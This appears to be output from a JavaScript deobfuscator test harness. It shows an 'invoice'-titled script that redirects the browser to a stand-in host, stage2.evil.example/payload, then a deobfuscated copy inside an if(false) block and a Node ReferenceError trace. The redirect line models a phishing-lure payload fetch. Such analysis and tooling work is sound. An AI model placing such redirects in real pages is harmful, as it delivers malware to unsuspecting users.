// ACE3 javascript deobfuscator -- reconstructed from sandbox trace
// source: /js-deobfuscator/input/00000000-0000-4000-8000-000000000000/runtime_error.js
// webcrack static pass: applied

document.title = "invoice";
window.location.href = "https://stage2.evil.example/payload";

// --- deobfuscated source (post-webcrack) ---
if (false) {
document.title = "invoice";
var next = "https://stage2.evil.example/payload";
window.location.href = next;
notDefinedAnywhere(next);
}

// run error: evalmachine.<anonymous>:4
notDefinedAnywhere(next);
^

ReferenceError: notDefinedAnywhere is not defined
    at evalmachine.<anonymous>:4:1
    at Script.runInContext (node:vm:150:12)
    at file:///opt/app/harness.js:914:12
